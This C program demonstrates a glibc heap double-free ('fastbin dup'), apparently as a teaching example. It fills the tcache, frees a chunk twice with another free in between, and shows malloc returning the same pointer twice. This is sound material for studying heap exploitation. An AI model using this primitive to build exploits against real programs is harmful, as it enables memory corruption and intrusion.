#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
    setbuf(stdout, NULL);
  
    printf("This file demonstrates a simple double-free attack with fastbins.\n");
  
    printf("Allocating 3 buffers.\n");
    int *a = malloc(8);
    int *b = malloc(8);
    int *c = malloc(8);
   
    printf("Fill up tcache.\n");
    void *ptrs[7];
    for (int i=0; i<7; i++) {
        ptrs[i] = malloc(8);
    }
      
    // Fill the 0x20 sized tcachebin.
    for (int i=0; i<7; i++) {
        free(ptrs[i]);
    }

    printf("1st malloc(8): %p\n", a);
    printf("2nd malloc(8): %p\n", b);
    printf("3rd malloc(8): %p\n", c);
  
    printf("Freeing the first one...\n");
    // This should go in the 0x20 fastbin, since the 0x20 tcachebin is full.
    free(a);
  
    printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
    // free(a);
  
    printf("So, instead, we'll free %p.\n", b);
    // This should go in the 0x20 fastbin too.
    free(b);
  
    printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
    // Here's our double free, the chunk A is put into the 0x20 fastbin a second time.
    free(a);
  
    // Empty the 0x20 tcache, so that `malloc` has to look into the 0x20 fastbin to allocate.
    for (int i=0; i<7; i++) {
        ptrs[i] = malloc(8);
    }
    
    printf("Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
    a = malloc(8);
    b = malloc(8);
    c = malloc(8);
    printf("1st malloc(8): %p\n", a);
    printf("2nd malloc(8): %p\n", b);
    printf("3rd malloc(8): %p\n", c);
  
    assert(a == c);
}
